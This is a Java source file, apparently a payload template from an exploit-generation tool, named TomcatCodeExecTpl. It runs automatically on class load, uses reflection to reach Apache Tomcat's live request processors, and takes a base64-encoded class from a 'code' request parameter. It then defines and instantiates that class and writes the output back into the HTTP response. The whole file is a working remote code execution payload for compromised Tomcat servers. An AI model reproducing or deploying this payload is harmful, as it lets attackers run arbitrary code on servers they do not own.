package jeg.core.template.tomcat;

import java.io.Writer;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;


public class TomcatCodeExecTpl {

    static {
        new TomcatCodeExecTpl();
    }

    public TomcatCodeExecTpl(){
        run();
    }

    private String getReqParamName() {
        return "code";
    }

    private void run() {
        try {
            Method var0 = Thread.class.getDeclaredMethod("getThreads", (Class[]) (new Class[0]));
            var0.setAccessible(true);
            Thread[] var1 = (Thread[]) ((Thread[]) var0.invoke((Object) null));
            for (int var2 = 0; var2 < var1.length; ++var2) {
                if (var1[var2].getName().contains("http") && var1[var2].getName().contains("Acceptor")) {
                    Field var3 = var1[var2].getClass().getDeclaredField("target");
                    var3.setAccessible(true);
                    Object var4 = var3.get(var1[var2]);

                    try {
                        var3 = var4.getClass().getDeclaredField("endpoint");
                    } catch (NoSuchFieldException var15) {
                        var3 = var4.getClass().getDeclaredField("this$0");
                    }

                    var3.setAccessible(true);
                    var4 = var3.get(var4);

                    try {
                        var3 = var4.getClass().getDeclaredField("handler");
                    } catch (NoSuchFieldException var14) {
                        try {
                            var3 = var4.getClass().getSuperclass().getDeclaredField("handler");
                        } catch (NoSuchFieldException var13) {
                            var3 = var4.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
                        }
                    }
                    var3.setAccessible(true);
                    var4 = var3.get(var4);
                    try {
                        var3 = var4.getClass().getDeclaredField("global");
                    } catch (NoSuchFieldException var12) {
                        var3 = var4.getClass().getSuperclass().getDeclaredField("global");
                    }
                    var3.setAccessible(true);
                    var4 = var3.get(var4);
                    var4.getClass().getClassLoader().loadClass("org.apache.coyote.RequestGroupInfo");
                    if (var4.getClass().getName().contains("org.apache.coyote.RequestGroupInfo")) {
                        var3 = var4.getClass().getDeclaredField("processors");
                        var3.setAccessible(true);
                        ArrayList var5 = (ArrayList) var3.get(var4);
                        for (int var6 = 0; var6 < var5.size(); ++var6) {
                            var3 = var5.get(var6).getClass().getDeclaredField("req");
                            var3.setAccessible(true);
                            var4 = var3.get(var5.get(var6)).getClass().getDeclaredMethod("getNote", Integer.TYPE).invoke(var3.get(var5.get(var6)), 1);
                            String var8;
                            try {
                                // 从 request body 获取参数
                                var8 = (String) var4.getClass().getDeclaredMethod("getParameter", String.class).invoke(var4, getReqParamName());
                                if (var8 != null) {
                                    String var10 = exec(var8);
                                    Object response = var4.getClass().getDeclaredMethod("getResponse", new Class[0]).invoke(var4);
                                    Writer writer = (Writer) response.getClass().getMethod("getWriter", new Class[0]).invoke(response, new Object[0]);
                                    writer.write(var10);
                                    writer.flush();
                                    writer.close();
                                    break;
                                }
                            } catch (Exception ignored) {
                            }
                        }
                    }
                }
            }
        } catch (Throwable var16) {
        }

    }

    private String exec(String var2) {
        try {
            byte[] clazzByte = base64Decode(var2);
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class clazz = (Class) defineClass.invoke(Thread.currentThread().getContextClassLoader(), clazzByte, 0, clazzByte.length);
            return clazz.newInstance().toString();
        } catch (Exception e) {
            return e.getMessage();
        }
    }

    private byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception var4) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke((Object) null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
}
